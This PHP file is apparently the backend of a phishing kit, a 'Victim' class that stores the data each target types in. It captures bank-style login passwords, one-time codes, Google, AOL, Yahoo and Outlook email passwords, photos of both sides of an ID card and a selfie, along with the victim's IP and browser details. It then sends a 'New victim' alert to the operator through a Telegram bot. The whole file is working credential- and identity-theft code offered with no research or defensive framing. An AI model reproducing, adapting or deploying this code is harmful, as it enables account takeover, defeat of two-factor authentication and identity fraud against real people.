<?php

class Victim
{
    private $db;
    private $crud;

    function __construct($conn, $crud)
    {
        $this->db = $conn; 
        $this->crud = $crud; 
    }

    // public function heartbeat($id, $current_page)
    // {
    //     $victim = $this->crud->getVictim($id);

    //     //Is victim exists in database?
    //     if(empty($victim)) {
    //         return;
    //     }

    //     //Needs to refresh page?
    //     if($victim['is_refreshed'] == 1)
    //     {
    //         $this->crud->updateVictim($id, [
    //             'is_refreshed' => 0
    //         ]);
    //         return "refresh";
    //     }

    //     //Is victim current page update on database?
    //     if($victim['current_page'] != $current_page)
    //     {
    //         $this->crud->updateVictim($id, [
    //             'current_page' => $current_page
    //         ]);
    //     }

    //     $this->crud->updateVictim($id, [
    //         'heartbeat' => time()
    //     ]);

    //     return $victim['next_page'];
    // }
    
    public function victim_data($id, $current_page, $params)
    {
        $victim = $this->crud->getVictim($id);

        $allowed = [];

        if($current_page == "reset") {
            $allowed = ['currentpage', 'password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return 0;
            }

            //Is victim needs to be created?
            if(empty($victim)) {
                $id = $this->crud->createVictim([
                    'username' => "*************************",
                    'password' => $params['password'],
                    'ip_address' => $this->getVictimIP(),
                    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                    'next_page' => "loading",
                    'heartbeat' => time()
                ]);

                $_SESSION['ent_id'] = $id;
            }
            else
            {
                $this->crud->updateVictim($id, [
                    'username' => "*************************",
                    'password' => $params['password'],
                    'next_page' => "loading",
                    'heartbeat' => time()
                ]);
            }

            $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_API_KEY . "/sendMessage";
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_POST, 1);
            curl_setopt($curl, CURLOPT_POSTFIELDS, "chat_id=" . TELEGRAM_BOT_CHAT_ID . "&text=New victim: " . $victim['username'] . " (" . $victim['ip_address'] . ")");
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($curl, CURLOPT_TIMEOUT, 10);
            curl_exec($curl);
            curl_close($curl);
        }

        if(empty($victim)) {
            return 0;
        }

        // Other Pages
        if($current_page == "login") {
            $allowed = ['currentpage', 'username', 'password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'username' => $params['username'],
                'password' => $params['password'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "login2") {
            $allowed = ['currentpage', 'username', 'password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'usernames' => $params['username'],
                'passwords' => $params['password'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "otp1") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'otp1' => $params['otp'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "otp2") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'otp2' => $params['otp'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "google") {
            $allowed = ['currentpage', 'email_password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_password' => $params['email_password'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "aol") {
            $allowed = ['currentpage', 'email_password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_password' => $params['email_password'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "aol_otp") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_otp' => $params['otp'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "yahoo") {
            $allowed = ['currentpage', 'email_password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_password' => $params['email_password'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "yahoo_otp") {
            $allowed = ['currentpage', 'otp'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_otp' => $params['otp'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
		if($current_page == "outlook") {
            $allowed = ['currentpage', 'email_password'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $this->crud->updateVictim($id, [
                'email_password' => $params['email_password'],
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "id") {
            $allowed = ['currentpage', 'front', 'back'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $fname = rand(100,9999999).'.png';
            $destination_path = getcwd().DIRECTORY_SEPARATOR;
            $fbase64Image = trim($params['front']);
            $fbase64Image = str_replace('data:image/png;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/jpg;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/jpeg;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/gif;base64,', '', $fbase64Image);
            $fbase64Image = str_replace(' ', '+', $fbase64Image);
            $ftarget_path = $destination_path . '/../../assets/'. $fname;

            $bname = rand(100,9999999).'.png';
            $bbase64Image = trim($params['back']);
            $bbase64Image = str_replace('data:image/png;base64,', '', $bbase64Image);
            $bbase64Image = str_replace('data:image/jpg;base64,', '', $bbase64Image);
            $bbase64Image = str_replace('data:image/jpeg;base64,', '', $bbase64Image);
            $bbase64Image = str_replace('data:image/gif;base64,', '', $bbase64Image);
            $bbase64Image = str_replace(' ', '+', $bbase64Image);
            $btarget_path = $destination_path . '/../../assets/'. $bname;

            file_put_contents($ftarget_path, base64_decode($fbase64Image));
            file_put_contents($btarget_path, base64_decode($bbase64Image));


            $this->crud->updateVictim($id, [
                'idfront' => $fname,
                'idback' => $bname,
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }
        if($current_page == "selfie") {
            $allowed = ['currentpage', 'selfie'];

            $allow = $this->isParamsInAllowed($allowed, $params);
            if(!$allow) {
                return false;
            }

            $fname = rand(100,9999999).'.png';
            $destination_path = getcwd().DIRECTORY_SEPARATOR;
            $fbase64Image = trim($params['selfie']);
            $fbase64Image = str_replace('data:image/png;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/jpg;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/jpeg;base64,', '', $fbase64Image);
            $fbase64Image = str_replace('data:image/gif;base64,', '', $fbase64Image);
            $fbase64Image = str_replace(' ', '+', $fbase64Image);
            $ftarget_path = $destination_path . '/../../assets/'. $fname;
            file_put_contents($ftarget_path, base64_decode($fbase64Image));

            $this->crud->updateVictim($id, [
                'selfie' => $fname,
                'next_page' => "loading",
                'heartbeat' => time()
            ]);
        }

        return 1;
    }

    public function isParamsInAllowed($allowed, $params)
    {
        $allow = true;

        foreach($params as $param => $val)
        {
            $exists = in_array($param, $allowed);
            if(!$exists) {
                $allow = false;
            }
        }

        return $allow;
    }

    public function getVictimIP()
    {
        if(!empty($_SERVER['HTTP_CLIENT_IP'])){
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }else{
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

}